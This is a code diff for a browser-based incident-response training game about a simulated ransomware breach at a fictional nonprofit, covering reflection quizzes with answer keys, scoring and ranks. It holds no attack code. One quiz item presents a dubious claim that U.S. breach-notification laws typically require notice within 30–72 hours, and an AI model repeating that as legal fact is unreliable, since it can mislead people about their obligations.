+            correct: 'Correct! The Respond function covers immediate actions during an active incident — revoking stolen credentials, isolating compromised systems, and blocking the attacker. SafeStart also failed at Protect (no MFA, excessive privileges) and Detect (no monitoring), but right now the priority is Respond.',
+            incorrect: 'The answer is Respond. When an attack is actively happening, you are in the Respond phase — revoking credentials, isolating systems, and stopping the attacker. Identify, Protect, and Detect are all important, but they happen before the incident. Recover comes after.'
+        }
+    },
+    {
+        id: 'root-cause',
+        category: 'Root Cause',
+        question: 'If SafeStart could have implemented only ONE control that would have greatly reduced the effects of this entire attack, what would it have been?',
+        options: [
+            { text: 'Enable MFA on all accounts', correct: true },
+            { text: 'Better phishing awareness training for staff', correct: false },
+            { text: 'Remove the volunteer\'s admin rights', correct: false },
+            { text: 'Stronger password requirements', correct: false }
+        ],
+        feedback: {
+            correct: 'Correct! MFA (multi-factor authentication) is the single biggest lever here. Even after the director\'s password was stolen via phishing, MFA would have blocked the attacker from logging in — stopping the entire chain cold. Training and least privilege are also important, but MFA directly addresses the moment the breach became possible.',
+            incorrect: 'The best answer is MFA. The attacker got in because they had the director\'s password and there was nothing else blocking them. MFA would have stopped the login even with the correct password. Training helps prevent the phishing click, but humans will always make mistakes — MFA is a technical control that doesn\'t rely on human behavior.'
+        }
+    },
+    {
+        id: 'notification',
+        category: 'Stakeholder Notification',
+        question: 'SafeStart\'s student and donor data may have been exposed. Under most U.S. data breach laws, who must be notified and when?',
+        options: [
+            { text: 'Only law enforcement, within 72 hours', correct: false },
+            { text: 'Affected individuals and relevant authorities, typically within 30–72 hours depending on state law', correct: true },
+            { text: 'Only the board of directors — it\'s an internal matter', correct: false },
+            { text: 'No one, unless credit card numbers were confirmed stolen', correct: false }
+        ],
+        feedback: {
+            correct: 'Correct! Most U.S. state breach notification laws require organizations to notify affected individuals (students, donors, parents) and sometimes state authorities within a set window — often 30 to 72 hours. Transparency matters: people need to know so they can protect themselves, like monitoring for fraud or changing passwords.',
+            incorrect: 'The correct answer is: affected individuals and relevant authorities, typically within 30–72 hours. U.S. data breach laws (which vary by state) generally require notifying the people whose data was exposed, not just internal stakeholders or law enforcement. Waiting or staying silent can lead to legal penalties and loss of trust.'
+        }
+    }
+];
+
+function showReflectionScreen() {
+    showScreen('reflection-screen');
+    const container = document.getElementById('reflection-questions-container');
+    container.innerHTML = '';
+
+    reflectionQuestions.forEach((q, qi) => {
+        const qDiv = document.createElement('div');
+        qDiv.style.cssText = 'background:#16213e; border:1px solid #333; border-radius:10px; padding:20px; margin-bottom:25px;';
+        qDiv.innerHTML = `
+            <div style="font-size:11px; text-transform:uppercase; letter-spacing:1px; color:#4a90e2; margin-bottom:8px;">Question ${qi + 1} — ${q.category}</div>
+            <div style="color:#e0e0e0; font-size:15px; line-height:1.6; margin-bottom:15px;">${q.question}</div>
+            <div id="reflection-options-${q.id}">
+                ${q.options.map((opt, oi) => `
+                    <div class="quiz-option" data-qid="${q.id}" data-oi="${oi}" data-correct="${opt.correct}"
+                         onclick="selectReflectionOption('${q.id}', ${oi})"
+                         style="margin-bottom:8px;">${opt.text}</div>
+                `).join('')}
+            </div>
+            <div id="reflection-feedback-${q.id}" class="quiz-feedback" style="margin-top:10px;"></div>
+        `;
+        container.appendChild(qDiv);
+    });
+}
+
+function selectReflectionOption(qid, oi) {
+    document.querySelectorAll(`[data-qid="${qid}"]`).forEach(el => el.classList.remove('selected'));
+    document.querySelector(`[data-qid="${qid}"][data-oi="${oi}"]`).classList.add('selected');
+}
+
+function submitReflection() {
+    if (gameState.reflectionSubmitted || gameState.reflectionPoints > 0) {
+        alert('Reflection answers have already been submitted.');
+        return;
+    }
+    let allAnswered = true;
+    reflectionQuestions.forEach(q => {
+        const selected = document.querySelector(`[data-qid="${q.id}"].selected`);
+        if (!selected) allAnswered = false;
+    });
+
+    if (!allAnswered) {
+        alert('Please answer all three questions before submitting.');
+        return;
+    }
+
+    let pointsEarned = 0;
+    reflectionQuestions.forEach(q => {
+        const selected = document.querySelector(`[data-qid="${q.id}"].selected`);
+        const isCorrect = selected.dataset.correct === 'true';
+        const feedbackEl = document.getElementById(`reflection-feedback-${q.id}`);
+
+        if (isCorrect) {
+            pointsEarned += 15;
+            feedbackEl.textContent = '✓ ' + q.feedback.correct;
+            feedbackEl.classList.add('visible', 'correct');
+            feedbackEl.classList.remove('incorrect');
+        } else {
+            feedbackEl.textContent = '✗ ' + q.feedback.incorrect;
+            feedbackEl.classList.add('visible', 'incorrect');
+            feedbackEl.classList.remove('correct');
+        }
+
+        // Lock options after submit
+        document.querySelectorAll(`[data-qid="${q.id}"]`).forEach(el => {
+            el.style.pointerEvents = 'none';
+            if (el.dataset.correct === 'true') el.style.background = 'rgba(0,200,0,0.2)';
+        });
+    });
+
+    gameState.reflectionPoints = pointsEarned;
+    gameState.score += pointsEarned;
+    updateScore();
+
+    // Replace submit button with continue to IR plan button
+    const btn = document.getElementById('reflection-submit-btn');
+    btn.textContent = 'Continue to Incident Response Plan →';
+    btn.onclick = function() {
+        showScreen('portal-screen');
+        switchTab('irplan');
+        // Unlock IR plan now that reflection is complete
+        gameState.reflectionSubmitted = true;
+        const lockMessage = document.getElementById('irplan-lock-message');
+        if (lockMessage && gameState.timelineSubmitted) {
+            lockMessage.innerHTML = `<p style="color:#00ff00;font-weight:bold;">✓ REFLECTION COMPLETE — You may now select and submit an incident response plan.</p>`;
+            lockMessage.style.background = 'rgba(0,0,0,0.2)';
+            lockMessage.style.borderColor = '#00ff00';
+        }
+    };
+}
+
+function showResults() {
+    showScreen('results-screen');
+    if (gameState.ransomCountdownInterval) {
+        clearInterval(gameState.ransomCountdownInterval);
+        gameState.ransomCountdownInterval = null;
+    }
+    document.getElementById('final-score').textContent = gameState.score;
+
+    // Determine if they earned the decryption key
+    // Must complete timeline correctly AND submit correct IR plan
+    const earnedKey = gameState.timelineCorrect && gameState.irPlanCorrect;
+
+    // Compute rank early so we can use it in status messaging too
+    const scoreForRank = gameState.score;
+    let earlyRank;
+    if (scoreForRank >= 370)      earlyRank = 'Master Investigator';
+    else if (scoreForRank >= 310) earlyRank = 'Senior Analyst';
+    else if (scoreForRank >= 245) earlyRank = 'Security Analyst';
+    else if (scoreForRank >= 175) earlyRank = 'Junior Analyst';
+    else                           earlyRank = 'Trainee';
+
+    // Update decryption status with rank-aware messaging
+    const statusDiv = document.getElementById('decryption-status');
+    if (earnedKey) {
+        // Vary the flavor text by rank
+        let flavorLine = '';
+        if (earlyRank === 'Master Investigator') {
+            flavorLine = 'Flawless. You reconstructed the entire attack, chose the right response, and understood the deeper lessons. That\'s the full package.';
+        } else if (earlyRank === 'Senior Analyst') {
+            flavorLine = 'Strong work. You nailed the timeline and response plan — some evidence slipped by, but you got what mattered most.';
+        } else {
+            flavorLine = 'You figured out what needed to happen to stop us. The timeline and response plan were correct — that\'s enough to get your files back.';
+        }
+        statusDiv.innerHTML = `
+            <div style="background: rgba(0, 255, 0, 0.2); border: 3px solid #00ff00; padding: 30px; border-radius: 10px; text-align: center; animation: buttonGlow 2s infinite;">
+                <div style="font-size: 48px; margin-bottom: 15px;">🔓</div>
+                <h2 style="color: #00ff00; font-size: 28px; margin-bottom: 15px;">DECRYPTION KEY GRANTED</h2>
+                <p style="color: #4ade80; font-size: 16px; margin-bottom: 10px;">Impressive. You actually figured it out.</p>
+                <p style="color: #e0e0e0; font-size: 14px; line-height: 1.6;">${flavorLine}</p>
+                <p style="color: #00ff00; font-size: 18px; margin-top: 20px; font-weight: bold;">✓ SYSTEMS DECRYPTED</p>
+                <p style="color: #888; font-size: 13px; margin-top: 10px; font-style: italic;">Your files have been restored. Maybe you've learned something about security.</p>
+            </div>
+        `;
+        document.getElementById('results-title').textContent = earlyRank === 'Master Investigator' ? 'Mission Accomplished!' : 'Investigation Complete';
+    } else {
+        // Vary the denied message by what they got wrong and their rank
+        let deniedDetail = '';
+        if (!gameState.timelineCorrect) deniedDetail += '• Your attack timeline was not in the correct order.<br>';
+        if (!gameState.irPlanCorrect)   deniedDetail += '• Your incident response plan was insufficient or incorrect.<br>';
+
+        let deniedTone = '';
+        if (earlyRank === 'Junior Analyst' || earlyRank === 'Trainee') {
+            deniedTone = 'You found some evidence but didn\'t connect all the dots. Review what you discovered and think about the order events happened and what should be done first.';
+        } else {
+            deniedTone = 'You were close — but getting the timeline or response plan wrong means the recovery plan has gaps. Review your findings.';
+        }
+        statusDiv.innerHTML = `
+            <div style="background: rgba(255, 0, 0, 0.2); border: 3px solid #ff0000; padding: 30px; border-radius: 10px; text-align: center; animation: borderPulse 1s infinite;">
+                <div style="font-size: 48px; margin-bottom: 15px;">🔒</div>
+                <h2 style="color: #ff0000; font-size: 28px; margin-bottom: 15px;">ACCESS DENIED</h2>
+                <p style="color: #ff6b6b; font-size: 16px; margin-bottom: 10px;">You failed to prove your understanding.</p>
+                <p style="color: #e0e0e0; font-size: 14px; line-height: 1.6;">${deniedDetail}</p>
+                <p style="color: #e0e0e0; font-size: 13px; line-height: 1.6; margin-top: 8px;">${deniedTone}</p>
+                <p style="color: #ff0000; font-size: 18px; margin-top: 20px; font-weight: bold;">⚠️ SYSTEMS REMAIN ENCRYPTED</p>
+                <p style="color: #888; font-size: 13px; margin-top: 10px; font-style: italic;">We told you: if you can't figure it out, you deserve to stay locked out.</p>
+                <p style="color: #ffff00; font-size: 14px; margin-top: 15px;">Better luck next time... or pay the $15,000. 💰</p>
+            </div>
+        `;
+        document.getElementById('results-title').textContent = 'Investigation Complete';
+    }
+
+    const breakdown = document.getElementById('results-breakdown');
+
+    // Calculate quiz points (15 pts each)
+    const quizPoints = gameState.answeredQuizzes.size * 15;
+
+    // Calculate user audit points (based on identified accounts and wrong guesses)
+    let auditPoints = 0;
+    gameState.auditIdentified.forEach(username => {
+        const accountInfo = suspiciousAccounts[username];
+        if (accountInfo) {
+            auditPoints += calculateAuditPoints(accountInfo.points);
+        }
+    });
+
+    // Determine rank (max 410 pts)
+    const score = gameState.score;
+    let rank, rankColor, rankIcon, rankDesc;
+    if (score >= 370) {
+        rank = 'Master Investigator';
+        rankColor = '#ffd700';
+        rankIcon = '🏆';
+        rankDesc = 'Outstanding. You identified every vulnerability and built a complete picture of the attack.';
+    } else if (score >= 310) {
+        rank = 'Senior Analyst';
+        rankColor = '#c0c0c0';
+        rankIcon = '🥈';
+        rankDesc = 'Strong work. You caught most of the key evidence and put together a solid response plan.';
+    } else if (score >= 245) {
+        rank = 'Security Analyst';
+        rankColor = '#cd7f32';
+        rankIcon = '🥉';
+        rankDesc = 'Good effort. You found the major clues but missed some details. Keep digging next time.';
+    } else if (score >= 175) {
+        rank = 'Junior Analyst';
+        rankColor = '#4a90e2';
+        rankIcon = '🔍';
+        rankDesc = 'You got started but left a lot of evidence on the table. Review what you missed.';
+    } else {
+        rank = 'Trainee';
+        rankColor = '#888';
+        rankIcon = '📋';
+        rankDesc = 'There\'s a lot more to discover. Every clue matters in a real incident.';
+    }
+
+    // Perfect finish: timeline correct + IR plan correct + all reflection answered
+    const allReflectionCorrect = gameState.reflectionPoints === 45;
+    const perfectFinish = gameState.timelineCorrect && gameState.irPlanCorrect && allReflectionCorrect;
+    const partialFinish = gameState.timelineCorrect && gameState.irPlanCorrect && !allReflectionCorrect;
+
+    const perfectBonusHTML = perfectFinish ? `
+        <div style="background: linear-gradient(135deg, rgba(255,215,0,0.2), rgba(255,165,0,0.1)); border: 2px solid #ffd700; border-radius: 10px; padding: 20px; margin: 20px 0; text-align: center; animation: buttonGlow 2s infinite;">
+            <div style="font-size: 36px; margin-bottom: 10px;">⭐ PERFECT FINISH ⭐</div>
+            <p style="color: #ffd700; font-size: 16px; font-weight: bold; margin-bottom: 8px;">Timeline + Incident Response + Reflection: All Correct!</p>
+            <p style="color: #e0e0e0; font-size: 13px; line-height: 1.5;">You didn't just find the clues — you understood what they meant, knew exactly how to respond, and could explain the principles behind the decisions. That's the full package.</p>
+        </div>
+    ` : partialFinish ? `
+        <div style="background: linear-gradient(135deg, rgba(0,200,100,0.15), rgba(0,150,80,0.1)); border: 2px solid #4ade80; border-radius: 10px; padding: 20px; margin: 20px 0; text-align: center;">
+            <div style="font-size: 36px; margin-bottom: 10px;">✅ STRONG FINISH</div>
+            <p style="color: #4ade80; font-size: 16px; font-weight: bold; margin-bottom: 8px;">Timeline + Incident Response: Both Correct!</p>
+            <p style="color: #e0e0e0; font-size: 13px; line-height: 1.5;">You nailed the investigation and response plan. Review the reflection question feedback to fill in the remaining gaps.</p>
+        </div>
+    ` : '';
+
+    breakdown.innerHTML = `
+        <div style="text-align: center; margin: 25px 0 30px;">
+            <div style="font-size: 52px; margin-bottom: 10px;">${rankIcon}</div>
+            <div style="font-size: 26px; font-weight: bold; color: ${rankColor}; margin-bottom: 8px;">${rank}</div>
+            <div style="font-size: 13px; color: #aaa; max-width: 400px; margin: 0 auto; line-height: 1.5;">${rankDesc}</div>
+        </div>
+        ${perfectBonusHTML}
+        <h3 style="margin-top: 20px; margin-bottom: 15px; color: #b0c8e8; font-size: 14px; text-transform: uppercase; letter-spacing: 1px;">Score Breakdown</h3>
+        <div class="results-breakdown-item">
+            <span>Email Analysis</span>
+            <span>${gameState.emailPoints} / 95 pts</span>
+        </div>
+        <div class="results-breakdown-item">
+            <span>Pop Quizzes</span>
+            <span>${quizPoints} / 75 pts</span>
+        </div>
+        <div class="results-breakdown-item">
+            <span>User Audit</span>
+            <span>${auditPoints} / 45 pts</span>
+        </div>
+        <div class="results-breakdown-item">
+            <span>Timeline Reconstruction</span>
+            <span>${gameState.timelineSubmitted ? gameState.timelinePoints : '0'} / 50 pts</span>
+        </div>
+        <div class="results-breakdown-item">
+            <span>Incident Response Plan</span>
+            <span>${gameState.irPlanCorrect ? '100' : '0'} / 100 pts</span>
+        </div>
+        <div class="results-breakdown-item">
+            <span>Reflection Questions</span>
+            <span>${gameState.reflectionPoints} / 45 pts</span>
+        </div>
+        <div class="results-breakdown-item" style="border-top: 2px solid #4a90e2; margin-top: 15px; padding-top: 15px;">
+            <span><strong>Total Score</strong></span>
+            <span><strong>${gameState.score} / 410 pts</strong></span>
+        </div>
+        ${renderTimelineReview()}
+    `;
+}
+
+function renderTimelineReview() {
+    if (!gameState.timelineSubmitted || !gameState.timelineFinalOrder) return '';
+
+    const sortedCorrect = [...timelineEvents].sort((a, b) => a.correctOrder - b.correctOrder);
+    const byId = {};
+    timelineEvents.forEach(ev => { byId[ev.id] = ev; });
+
+    let rows = '';
+    for (let i = 0; i < sortedCorrect.length; i++) {
+        const correctEvent = sortedCorrect[i];
+        const placedId = gameState.timelineFinalOrder[i];
+        const placedEvent = byId[placedId];
+        const isRight = placedId === correctEvent.id;
+        const icon = isRight ? '✓' : '✗';
+        const iconColor = isRight ? '#4ade80' : '#ff6b6b';
+        const placedText = placedEvent ? placedEvent.text : '(empty)';
+        const correctionLine = isRight ? '' : `
+            <div style="color: #aaa; font-size: 12px; margin-top: 4px; padding-left: 24px;">
+                Correct: ${correctEvent.text}
+            </div>`;
+        rows += `
+            <div style="padding: 10px 0; border-bottom: 1px solid #2a3a5a;">
+                <div style="display: flex; align-items: flex-start; gap: 10px;">
+                    <span style="color: #888; font-size: 12px; min-width: 60px;">${i + 1}. ${correctEvent.hiddenDate}</span>
+                    <span style="color: ${iconColor}; font-weight: bold; font-size: 16px;">${icon}</span>
+                    <span style="color: #e0e0e0; font-size: 13px; flex: 1;">${placedText}</span>
+                </div>
+                ${correctionLine}
+            </div>
+        `;
+    }
+
+    return `
+        <h3 style="margin-top: 30px; margin-bottom: 10px; color: #b0c8e8; font-size: 14px; text-transform: uppercase; letter-spacing: 1px;">Your Attack Timeline</h3>
+        <div style="background: rgba(74, 144, 226, 0.05); border: 1px solid #2a3a5a; border-radius: 6px; padding: 12px 16px;">
+            ${rows}
+        </div>
+    `;
+}
+
+
+</script>
+
+</body>
+</html>
